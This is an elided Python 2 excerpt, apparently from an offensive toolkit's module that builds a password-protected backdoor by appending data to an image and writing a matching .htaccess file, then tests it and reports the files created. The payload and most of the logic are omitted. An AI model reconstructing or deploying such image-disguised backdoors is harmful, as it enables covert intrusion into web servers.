...
class Img(Module):
    ...
    def _set_args(self):
        ...
        self.argparser.add_argument(
            'ldir', help='Dir where to save modified image and .htaccess', default='bd_output', nargs='?')
    ...
    def __append_bin_data(self, pathfrom, pathto, data):
        ...
        try:
            ...
            raise ModuleException(
                self.name, "%s %s" % (WARN_COPY_FAIL, str(e)))

        try:
            open(pathto, "ab").write(data)
        except Exception, e:
            raise ModuleException(
                self.name, "%s %s" % (WARN_WRITING_DATA, str(e)))
    ...
    def __php_test_backdoor(self, path):
        ...
        if status == 0 and 'TEST OK' in output:
            return True
        return False
    ...
    def _prepare(self):
        ...
        if not path.isfile(self.args['img']):
            raise ModuleException(self.name, "'%s' %s" %
                                  (self.args['img'], WARN_IMG_NOT_FOUND))
    ...
    def _probe(self):
        ...
        self.mprint("Backdoor files '%s' and '%s' created with password '%s'" % (
            path_img2, path_htaccess, self.args['pass']))
